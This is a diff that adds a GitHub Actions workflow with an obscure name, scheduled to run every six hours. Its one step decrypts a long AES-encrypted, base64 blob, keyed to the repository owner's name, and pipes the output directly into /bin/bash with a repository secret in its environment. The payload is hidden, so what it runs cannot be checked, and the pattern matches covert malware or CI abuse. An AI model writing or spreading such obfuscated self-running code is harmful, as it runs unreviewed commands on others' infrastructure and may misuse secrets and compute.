@@ -1,0 +1,15 @@
+name: naocan9708
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '57 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: naocan9708
+        env:
+          Parameters: ${{ secrets.Parameters }}
+        run: |
+          echo "U2FsdGVkX19gdizONuubIHhKf90VGg3Gsl2OAptA4S4JbffelsWMmQF80+4ch/q20ZfYdUGvSzL/mVjMxzi6McCapQD6d5INelvviOMrY178bmTZCyFAYbPyhQ0l1WwDPsckUYkSNbG3+mGvQt+t7vUvhIr1ITi96EYSXWYe/Wlx5JingpeeOJe0wiA0n/CnnIDQpaOeQldv1rdlJkH1O1LbgrL17tKqJjbw1yd7aCxt4E6CJzA/meXfuThOSauI6XAm49O4XZMy+1h36lsNd1Ro9n8+NkxgNHrWTFTmCACyUF5bYBRJgLq/13FLj7TOOYj0qsnPLQE1eZV+Ip/Eh99M+AgzeSWGV2WIFVsNkZPhapk5kfOxG426pNtCu0kKX6OqtiGIJcpFHcamPmLGZIwN62N77w88kfTjjyoGPpyrb7fg+/p2nD4q5mlCdj6pkfVQae4enRY1NUqjaFOG/8vorpAw/Jt4xvC5t0pUtTt3CDMfpZW0zQHkuJMYxgCcS7Z5JQkCTNx8kjt4fKpNxltNTTaiNDQ7E8/h7gobybPFWDZx1URkcniZVMYoVAQNaC2tVf04ECg/pKQbjbiR+EqjN42rg2fIjAoFeeA02/Sxkj8xIZlgbuUeeYWhw8At2bujNnvrYvaHaYq2wDucKsPn/aGKfifzl6NbLZH2/Cyg3mYlmSAgusfiHDocLM9Jnz8UcmVj3gA15GJqzuu3w1vPXNzVk2/iiMXaLy+pV4W6LDv2u088AhUQl6Rlqa5umIi6WDdAr/SqQR0y2cz9BF5OMTw5/E5/vlfkuXTOgD+hB4JLhWEq2DtB1INLKNw2Ofv0BPQjHUpAi4IUAC281ep84qCq80iISHMHqnJLF/pjFFDoTurxhz6EOV6YjU0RF563myDtgeIMBMMzbzksZI3+BKyFntg/3yhxhDz+9fNw+gf2EmzZT0ww0WJO+udSPj51JH9N73HwCwMBh+EJQ/KbFEUbUAGVg5BRf+aFIulxMNa3QTHCPXnWGeEUUePOVj31vKtDt/llv9ygSsodsUPWwP1lav/U77VnMnin4B7RAgfNmDtpfSf/kxdW/UJYBQiXT+FL17aFoAZn0BUdRTSpCO+4tZdzJFT+REfb7Ofrv4MlvZD8JZboLVsPScP3zQNZ1Zq9BDsrkM5TRag4fRb0v4/+sKV8FwDwHvj9FVThI7JBLWBpJo3fvzE8MACbzIVwEL5cKgxaKwv0SCiaXKtSXGr9y1VArwkJq91VnBYJQs1qWPzkMO59VLn9GF3mkQJWv1vlRi7wkagS3a1iYWlxbm+kOo+b7bpO3qVa7KYXipzzUudX/ea2gJTHPziMoERH1I4OUp91QovDr1WAr+jlw02pQHrKSoBc6MSZrFM18iQkur36tAM5ZxgyRK7k0PHrMYDfesUwiN6Ijw6vMKSi66uO+fhCWjkW83rUrtV+42esvCCqNNKvuTHb7G4pXgJ75oqVYexTqJS9tTZA00o8ZFMrwEmck2Rql3o8R/2nxC/frRdCEd+n9g5dBMGb8VqrIGjxfM9y/wk4rZjRKSfx8jzS3OKKKyX4IdTTflw1ZsqbTn+6nyTzfeA4Y2EbTPvlZ9ztb13SlpYlviqCtNGzaoU9JLMq7J60Bqcw4iK7EkQa4P2x7kxH8ojrrrEfwRbBWNHwWCeU+xkFccgKybADE3oNMTkl3Z+3EnfSJb81uWl2fMP+BXSEDTasuFdOb4A5elBLY4dzgbNdmBN66gb3z+MLtU430Xl+ex7ibPJN0Egm6c4T7BYMbTlJZGPVLVOnqhU8LV/4ccIE0pUDAiJ5Kp1S9x03brOI8UMpW3qKavGgxl1MB4MtBqAcdGplIQidYBeHkn3vRf9fhAcUlZd/2NPxGEyeINM4wuIBvjfVU/Nml3nDLfAAky5tVJi6Vxu66Jd2nvyOByYsSeGTyQ==" | openssl enc -d -aes-256-cbc -base64 -A -salt -pbkdf2 -pass pass:${GITHUB_REPOSITORY_OWNER} | /bin/bash
